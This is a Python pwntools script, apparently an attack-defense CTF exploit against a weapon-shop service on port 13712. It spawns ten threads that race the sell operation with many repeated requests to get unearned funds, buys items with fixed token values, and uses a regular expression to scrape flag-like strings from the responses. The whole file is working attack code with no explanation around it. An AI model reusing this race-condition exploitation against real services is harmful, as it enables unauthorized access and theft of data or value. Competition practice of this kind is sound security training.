#!/usr/bin/env python3
from pwn import *
import socket
import sys
import threading
import time

alphabet = string.ascii_lowercase + string.ascii_uppercase

host = None
port = 13712

def generate_string(charset = alphabet, size = 8):
    return ''.join(random.choice(charset) for _ in range(size))

def sell_weapon(sock):
    sock.send(b'3\n')
    sock.recvuntil(b'id: ')
    sock.send(b'0\n')
    sock.recvuntil(b'[y\\n]: ')
    sock.send(b'y\n')
    sock.recvuntil(b'[y\\n]: ')
    sock.send(b'n\n')
    sock.recvuntil(b'weapon?[y\\n]: ')
    sock.send(b'y\n')

def register_user(sock, username, password):
    sock.recvuntil(b'> ')
    sock.send(b'2\n')
    sock.recvuntil(b': ')
    sock.send(username.encode() + b'\n')
    sock.recv()
    sock.send(password.encode() + b'\n')
    sock.recvuntil(b'> ')

def race_worker():
    global host
    
    try:
        sock = remote(host, port)
        register_user(sock, generate_string(), generate_string())
        
        sell_weapon(sock)
        sock.recvuntil(b'> ')
        
        for i in range(50):
            sock.send(b'2\n')
            sock.recvuntil(b'> ')
            sock.send(b'4\n')
            sock.recvuntil(b'> ')
        
        sock.send(b'7\n')
        sock.recvuntil(b'> ')
        sock.send(b'3\n')
        sock.close()
    except:
        pass

if __name__ == '__main__':
    host = sys.argv[1]
    
    threads = []
    sock = remote(host, port, timeout = 15)
    sock.settimeout(15)
    username, password = generate_string(), generate_string()
    register_user(sock, username, password)
    
    for i in range(10):
        worker = threading.Thread(target = race_worker)
        worker.start()
        threads.append(worker)
    
    sell_weapon(sock)
    sock.recv()
    sock.send(b'\n5\n')
    sock.recv()
    sock.send(b'0\n')
    
    sock.interactive()
    sock.send(b'2\n')
    sock.recvuntil(b'> ')
    sock.send(b'4\n')
    sock.recvuntil(b'> ')
    sock.send(b'6\n')
    sock.recvuntil(b'> ')
    
    sock.send(b'3\n')
    data = sock.recvline()
    if b'have' in data:
        sys.exit(-1)
    
    sock.recvuntil(b'id: ')
    sock.send(b'0\n')
    sock.recvuntil(b'[y\\n]: ')
    sock.send(b'y\n')
    sock.recvuntil(b'[y\\n]: ')
    sock.send(b'y\n')
    sock.recvuntil(b': ')
    sock.send(b'test\n')
    sock.recvuntil(b'weapon?[y\\n]: ')
    sock.send(b'y\n')
    
    sock.recvuntil(b'> ')
    sock.send(b'2\n')
    sock.recvuntil(b'> ')
    sock.send(b'1\n')
    
    payload = ['1214843501', '3591948004']
    sock.recvuntil(b'[?] Enter item token: ')
    sock.send(payload[0].encode() + b'\n')
    data = sock.recv()
    
    if b'You dont have money to buy this' in data:
        sys.exit(-1)
    else:
        sock.send(b'y\n')
        
        data = sock.recvuntil(b'4. Exit\n> ')
        print(re.findall(r'[A-Z0-9]{31}=', data.decode()), flush = True)
        
        for i in range(1, len(payload)):
            sock.send(b'1\n')
            sock.recvuntil(b'[?] Enter item token: ')
            sock.send(payload[i].encode() + b'\n')
            sock.recv()
            sock.send(b'y\n')
            
            data = sock.recvuntil(b'4. Exit\n> ')
            print(re.findall(r'[A-Z0-9]{31}=', data.decode()), flush = True)
    
    sock.interactive()
    
    for thread in threads:
        thread.join()